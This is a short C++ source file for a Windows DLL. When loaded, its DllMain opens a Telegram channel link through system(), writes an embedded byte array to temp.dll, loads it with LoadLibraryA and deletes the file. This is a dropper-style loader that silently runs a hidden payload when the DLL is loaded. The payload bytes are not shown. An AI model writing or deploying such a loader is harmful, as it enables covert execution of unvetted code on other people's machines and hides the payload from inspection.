#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <iostream>
#include <fstream>
#include "module.hpp"
#include <wininet.h>
#include <Shellapi.h>


void loadDllFromByteArray(const unsigned char* byteArray, size_t byteLength)
{
    std::ofstream tempFile("temp.dll", std::ios::out | std::ios::binary);
    tempFile.write(reinterpret_cast<const char*>(byteArray), byteLength);
    tempFile.close();
    HMODULE hModule = LoadLibraryA("temp.dll");
    remove("temp.dll");
}
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
        case DLL_PROCESS_ATTACH:
        {
            system("start https://t.me/alloc_company");
            extern const unsigned char moduleBytes[];
            extern size_t moduleSize;
            loadDllFromByteArray(moduleBytes, moduleSize);
            break;
        }


    }
    return TRUE;
}
